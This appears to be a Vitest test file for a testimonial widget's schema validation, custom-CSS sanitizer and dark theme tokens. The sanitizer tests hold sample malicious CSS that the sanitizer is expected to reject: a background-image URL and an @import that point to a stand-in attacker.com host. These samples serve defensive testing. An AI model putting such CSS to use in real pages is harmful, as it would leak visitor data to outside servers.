import { describe, it, expect } from "vitest";
import { widgetSchema } from "../src/lib/validation/schemas";
import { sanitizeAndValidateCss } from "../src/lib/security/css-sanitizer";

describe("Pass 15: Dark Mode, Interactive Style Editor, Card Styles & Layout Variety", () => {
  describe("1. Widget Schema, Sizing Presets, Card Styles & Layouts Validation", () => {
    it("accepts valid Pass 15 presets (stacked_deck, orbit_avatars, transparent, outline, marqueeSpeed)", () => {
      const payload = {
        name: "Acme Portfolio Widget",
        slug: "acme-portfolio",
        themeConfig: {
          cardStyle: "transparent",
          fontPairing: "Outfit",
          layoutVariant: "stacked_deck",
          sizePreset: "large",
          customMaxWidth: "680px",
          borderRadius: 24,
          paddingDensity: "spacious",
          shadowIntensity: "pronounced",
          defaultTheme: "dark",
          textReveal: true,
          autoRotateInterval: 8,
          marqueeSpeed: 45,
          customCss: ".clientecho-card { border-width: 2px; }\n.clientecho-badge-verified { background-color: #10B981; }",
        },
        isActive: true,
      };

      const result = widgetSchema.safeParse(payload);
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.themeConfig.cardStyle).toBe("transparent");
        expect(result.data.themeConfig.layoutVariant).toBe("stacked_deck");
        expect(result.data.themeConfig.sizePreset).toBe("large");
        expect(result.data.themeConfig.customMaxWidth).toBe("680px");
        expect(result.data.themeConfig.borderRadius).toBe(24);
        expect(result.data.themeConfig.paddingDensity).toBe("spacious");
        expect(result.data.themeConfig.shadowIntensity).toBe("pronounced");
        expect(result.data.themeConfig.defaultTheme).toBe("dark");
        expect(result.data.themeConfig.textReveal).toBe(true);
        expect(result.data.themeConfig.autoRotateInterval).toBe(8);
        expect(result.data.themeConfig.marqueeSpeed).toBe(45);
      }
    });

    it("accepts orbit_avatars layout with outline cardStyle", () => {
      const payload = {
        name: "Orbit Avatars Widget",
        slug: "orbit-widget",
        themeConfig: {
          layoutVariant: "orbit_avatars",
          cardStyle: "outline",
          sizePreset: "compact",
        },
      };

      const result = widgetSchema.safeParse(payload);
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.themeConfig.layoutVariant).toBe("orbit_avatars");
        expect(result.data.themeConfig.cardStyle).toBe("outline");
        expect(result.data.themeConfig.sizePreset).toBe("compact");
      }
    });

    it("applies sensible defaults when presets are omitted (border default for cardStyle)", () => {
      const payload = {
        name: "Minimal Widget",
        slug: "minimal-widget",
        themeConfig: {},
      };

      const result = widgetSchema.safeParse(payload);
      expect(result.success).toBe(true);
      if (result.success) {
        expect(result.data.themeConfig.cardStyle).toBe("border");
        expect(result.data.themeConfig.layoutVariant).toBe("grid");
        expect(result.data.themeConfig.sizePreset).toBe("standard");
        expect(result.data.themeConfig.paddingDensity).toBe("comfortable");
        expect(result.data.themeConfig.shadowIntensity).toBe("subtle");
        expect(result.data.themeConfig.defaultTheme).toBe("light");
        expect(result.data.themeConfig.textReveal).toBe(false);
        expect(result.data.themeConfig.autoRotateInterval).toBe(6);
        expect(result.data.themeConfig.marqueeSpeed).toBe(35);
      }
    });

    it("rejects invalid autoRotateInterval (< 2s)", () => {
      const payload = {
        name: "Fast Rotator",
        slug: "fast-rotator",
        themeConfig: {
          autoRotateInterval: 1, // too fast, min is 2
        },
      };

      const result = widgetSchema.safeParse(payload);
      expect(result.success).toBe(false);
    });
  });

  describe("2. CSS API Class Layer Sanitization & Per-Element Target Rules", () => {
    it("allows valid Custom CSS rules targeting stable clientecho class API including per-badge sub-classes", () => {
      const validCss = `
        .clientecho-card {
          border-radius: 20px;
          border: 2px solid rgba(255, 255, 255, 0.2);
        }
        .clientecho-quote {
          font-style: italic;
          letter-spacing: 0.02em;
        }
        .clientecho-author-name {
          font-weight: 800;
        }
        .clientecho-author-title {
          font-size: 11px;
        }
        .clientecho-avatar {
          border-radius: 9999px;
          width: 36px;
          height: 36px;
        }
        .clientecho-badge {
          text-transform: uppercase;
        }
        .clientecho-badge-verified {
          background-color: #10B981;
          color: #FFFFFF;
        }
        .clientecho-badge-direct {
          border-color: #6366F1;
        }
        .clientecho-badge-self {
          background-color: rgba(255, 255, 255, 0.05);
        }
        .clientecho-stars {
          color: #EAB308;
          gap: 4px;
        }
        .clientecho-spotlight-chips {
          margin-top: 12px;
        }
        .clientecho-orbit-row {
          gap: 12px;
        }
      `;

      const result = sanitizeAndValidateCss(validCss);
      expect(result.valid).toBe(true);
      expect(result.sanitizedCss).toContain(".clientecho-card");
      expect(result.sanitizedCss).toContain(".clientecho-quote");
      expect(result.sanitizedCss).toContain(".clientecho-badge");
      expect(result.sanitizedCss).toContain(".clientecho-badge-verified");
      expect(result.sanitizedCss).toContain(".clientecho-badge-direct");
      expect(result.sanitizedCss).toContain(".clientecho-badge-self");
      expect(result.sanitizedCss).toContain(".clientecho-orbit-row");
    });

    it("REJECTS global selector hijacking or external exfiltration attempts", () => {
      const badCss1 = `body { background: red; }`;
      expect(sanitizeAndValidateCss(badCss1).valid).toBe(false);

      const badCss2 = `* { margin: 0; }`;
      expect(sanitizeAndValidateCss(badCss2).valid).toBe(false);

      const badCss3 = `.clientecho-card { background-image: url('https://attacker.com/leak'); }`;
      expect(sanitizeAndValidateCss(badCss3).valid).toBe(false);

      const badCss4 = `@import 'https://attacker.com/malicious.css';`;
      expect(sanitizeAndValidateCss(badCss4).valid).toBe(false);
    });
  });

  describe("3. Dark Theme Token Set Specification", () => {
    const darkThemeTokens = {
      bg: "#1A1A1D",
      card: "#232326",
      text: "#F3F3EF",
      textSecondary: "rgba(243, 243, 239, 0.65)",
      border: "rgba(255, 255, 255, 0.08)",
      shadow: "0 4px 20px rgba(0, 0, 0, 0.4)",
    };

    it("verifies dark theme tokens conform to the specified contrast design system", () => {
      expect(darkThemeTokens.bg).toBe("#1A1A1D");
      expect(darkThemeTokens.card).toBe("#232326");
      expect(darkThemeTokens.text).toBe("#F3F3EF");
      expect(darkThemeTokens.border).toBe("rgba(255, 255, 255, 0.08)");
    });
  });
});
